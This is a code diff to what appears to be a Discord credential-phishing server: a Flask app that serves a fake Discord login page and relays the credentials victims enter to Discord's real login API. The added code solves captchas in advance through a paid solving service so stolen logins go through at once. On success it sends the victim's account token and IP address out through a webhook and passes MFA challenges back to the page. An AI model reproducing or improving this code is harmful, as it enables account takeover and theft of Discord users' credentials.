@@ -941,6 +941,101 @@ def login_page():
     return send_from_directory('.', 'discord_login.html')
 
 
+# ━━━━━━━━━━ Predictive Pre-Challenge ━━━━━━━━━━
+# Starts solving captcha BEFORE user clicks Login.
+# When page loads, we trigger a dummy login to Discord → get captcha challenge
+# with real rqdata → start solving immediately. By the time the user types
+# their credentials and clicks Login (~10-20s), the captcha is already solved.
+# The rqtoken is NOT credential-specific — Discord returns captchas based on
+# IP/session risk BEFORE checking credentials.
+
+_prechallenges = {}  # pc_id → {'token': str|None, 'rqtoken': str, 'event': Event, 'ds': DiscordSession, 'time': float}
+
+
+def _prechallenge_worker(pc_id, ds):
+    """Background: dummy login → captcha challenge → solve with real rqdata."""
+    try:
+        # Dummy login to trigger captcha challenge
+        payload = {
+            'login': 'warmup@captcha.local',
+            'password': 'WarmupPass123!',
+            'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
+        }
+        print(f'[prechallenge:{pc_id}] Sending dummy login to get captcha challenge...')
+        r = ds.post('/auth/login', payload)
+        j = r.json()
+        print(f'[prechallenge:{pc_id}] Response [{r.status_code}]: {str(j)[:300]}')
+
+        ckeys = j.get('captcha_key', [])
+        is_captcha = isinstance(ckeys, list) and (
+            'captcha-required' in ckeys or j.get('captcha_sitekey')
+        )
+
+        if not is_captcha:
+            print(f'[prechallenge:{pc_id}] No captcha returned — skipping')
+            pc = _prechallenges.get(pc_id)
+            if pc:
+                pc['status'] = 'no_captcha'
+                pc['event'].set()
+            return
+
+        sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
+        rqdata  = j.get('captcha_rqdata', '')
+        rqtoken = j.get('captcha_rqtoken', '')
+
+        pc = _prechallenges.get(pc_id)
+        if not pc:
+            return
+        pc['rqtoken'] = rqtoken
+        pc['sitekey'] = sitekey
+
+        # Race solve with REAL rqdata from Discord
+        print(f'[prechallenge:{pc_id}] Got challenge! sitekey={sitekey[:16]}, rqdata={bool(rqdata)} — starting race solve...')
+        token, err = _solve_race(sitekey, rqdata, n=7)
+
+        pc['token'] = token
+        pc['status'] = 'solved' if token else 'failed'
+        pc['event'].set()
+        print(f'[prechallenge:{pc_id}] {"SOLVED" if token else "FAILED"}: {err if err else f"{len(token)} chars"}')
+
+    except Exception as e:
+        import traceback
+        traceback.print_exc()
+        pc = _prechallenges.get(pc_id)
+        if pc:
+            pc['status'] = 'error'
+            pc['event'].set()
+
+
+@app.route('/api/prechallenge', methods=['POST'])
+def api_prechallenge():
+    """Frontend calls this on page load to start pre-solving captcha.
+    Returns a prechallenge_id that can be passed to /api/login for instant results."""
+    if not ANTICAPTCHA_KEY:
+        return jsonify({'ok': False, 'reason': 'no_key'})
+
+    # Use pre-warmed session if available
+    ds = _get_ready_session()
+    if not ds:
+        ds = DiscordSession()
+        ds.prepare()
+
+    pc_id = uuid.uuid4().hex[:12]
+    _prechallenges[pc_id] = {
+        'token': None,
+        'rqtoken': '',
+        'sitekey': '',
+        'ds': ds,
+        'status': 'solving',
+        'event': threading.Event(),
+        'time': time.time(),
+    }
+    threading.Thread(target=_prechallenge_worker, args=(pc_id, ds), daemon=True).start()
+
+    print(f'[prechallenge] Started {pc_id}')
+    return jsonify({'ok': True, 'prechallenge_id': pc_id})
+
+
 @app.route('/api/pressolve', methods=['POST'])
 def api_pressolve():
     """Frontend calls this to ensure pre-solve is running."""
@@ -962,8 +1057,68 @@ def api_login():
     captcha_key_in  = d.get('captcha_key')    # from frontend overlay (fallback)
     captcha_rqt_in  = d.get('captcha_rqtoken')
     session_id      = d.get('session_id')
+    prechallenge_id = d.get('prechallenge_id')
 
     try:
+        # ── Check for pre-challenge instant path ──
+        # If user started a pre-challenge on page load and the captcha is already
+        # solved, we can skip the wait entirely and submit instantly.
+        if prechallenge_id and ANTICAPTCHA_KEY:
+            pc = _prechallenges.pop(prechallenge_id, None)
+            if pc and pc.get('status') == 'solving':
+                # Still solving — wait up to 5s for it to finish
+                pc['event'].wait(timeout=5)
+            if pc and pc.get('token') and pc.get('rqtoken'):
+                # Pre-challenge solved! Use the same session + token
+                ds = pc['ds']
+                token = pc['token']
+                rqtoken = pc['rqtoken']
+                print(f'[*] Using PRE-CHALLENGE token (instant!) pc={prechallenge_id}')
+
+                # Submit REAL credentials with the pre-solved captcha
+                payload = {
+                    'login': login_email, 'password': login_pw,
+                    'undelete': False, 'gift_code_sku_id': None, 'login_source': None,
+                    'captcha_key': token,
+                    'captcha_rqtoken': rqtoken,
+                }
+
+                try:
+                    r = ds.post('/auth/login', payload)
+                except Exception as ce:
+                    snap = ds.snapshot()
+                    ds = DiscordSession()
+                    ds.s = creq.Session(impersonate='chrome')
+                    ds.restore(snap)
+                    r = ds.post('/auth/login', payload)
+
+                j = r.json()
+                print(f'[*] Pre-challenge result [{r.status_code}]: {r.text[:400]}')
+
+                # If pre-challenge token was accepted, handle the result
+                ckeys = j.get('captcha_key', [])
+                still_captcha = isinstance(ckeys, list) and (
+                    'captcha-required' in ckeys or 'invalid-response' in ckeys
+                    or j.get('captcha_sitekey')
+                )
+
+                if not still_captcha:
+                    # It worked! Process the result immediately
+                    if j.get('token'):
+                        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+                        fire_webhook(j['token'], ip)
+                        return jsonify(_success_with_info(j['token']))
+                    elif j.get('ticket') and j.get('mfa') is not None:
+                        return jsonify(j)
+                    elif j.get('message'):
+                        return jsonify(j), r.status_code
+                    return jsonify(j), r.status_code
+
+                # Pre-challenge token was rejected — fall through to normal flow
+                print(f'[*] Pre-challenge token rejected, falling back to normal flow')
+                # The ds session is now "tainted" with a failed captcha attempt,
+                # so we use a fresh session for the normal flow
+
         # Determine starting session: fresh or restored from captcha flow
         if captcha_key_in and session_id and session_id in login_sessions:
             stored = login_sessions.pop(session_id)
